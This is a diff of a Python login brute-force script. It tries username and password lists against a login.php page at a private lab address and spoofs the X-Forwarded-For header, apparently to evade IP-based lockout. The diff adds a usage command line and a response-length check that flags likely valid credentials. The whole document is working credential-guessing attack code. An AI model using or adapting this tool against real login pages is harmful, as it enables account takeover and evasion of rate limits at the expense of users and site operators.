@@ -1,3 +1,4 @@
+# python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "usernames.txt" --passwords "passwords.txt"
 import argparse
 
 import requests
@@ -33,9 +34,13 @@ def brute_force(url, xff_ip, username_file, password_file, timeout=5):
                     url=url, headers=headers, data=data, timeout=timeout
                 )
 
-                print(f"code: {response.status_code}")
+                # print(f"code: {response.status_code}")
                 if (response.status_code) == 200:
-                    print(f"found {user}/{pwd}")
+                    # print(f"found {user}/{pwd}")
+                    # print(f"len content:{len(response.text)}")
+                    print("200")
+                if len(response.text) != 1770:
+                    print(f"not 1770: {user}/{pwd}")
             except requests.exceptions.RequestException as e:
                 print(f"error: {e}")
 
